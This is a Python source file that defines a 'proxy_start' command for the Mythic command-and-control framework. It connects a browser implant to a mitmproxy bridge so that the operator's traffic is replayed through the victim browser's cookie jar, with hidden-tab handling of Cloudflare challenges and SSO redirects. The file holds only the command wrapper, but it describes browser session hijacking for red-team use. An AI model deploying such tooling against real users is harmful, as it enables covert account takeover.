from mythic_container.MythicCommandBase import (
    CommandBase, TaskArguments, CommandParameter, ParameterType,
    MythicTask, PTTaskMessageAllData, PTTaskProcessResponseMessageResponse,
    CommandAttributes,
)


class ProxyStartArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="proxy_url",
                type=ParameterType.String,
                description="WSS URL of the mitm_server.py endpoint (e.g. wss://host:443/ws)",
            ),
        ]

    async def parse_arguments(self):
        if self.command_line.strip():
            stripped = self.command_line.strip()
            if stripped.startswith("{"):
                self.load_args_from_json_string(stripped)
            else:
                self.add_arg("proxy_url", stripped)


class ProxyStartCommand(CommandBase):
    cmd            = "proxy_start"
    needs_admin    = False
    help_cmd       = "proxy_start <wss://host:port/path>"
    description    = (
        "Connect the agent to the mitmproxy bridge server. Once connected, "
        "all traffic routed through the proxy host will be replayed through this "
        "browser's cookie jar. Handles Cloudflare JS challenges via hidden tab "
        "fallback and SSO meta-refresh and form-POST redirect chains."
    )
    version        = 1
    author         = "@asaurusrex"
    argument_class = ProxyStartArguments
    parameters     = []
    attackmapping  = ["T1090", "T1185"]
    attributes     = CommandAttributes(filter_by_build_parameter={}, supported_os=[])

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        proxy_url = task.args.get_arg("proxy_url")
        task.display_params = proxy_url
        return task

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
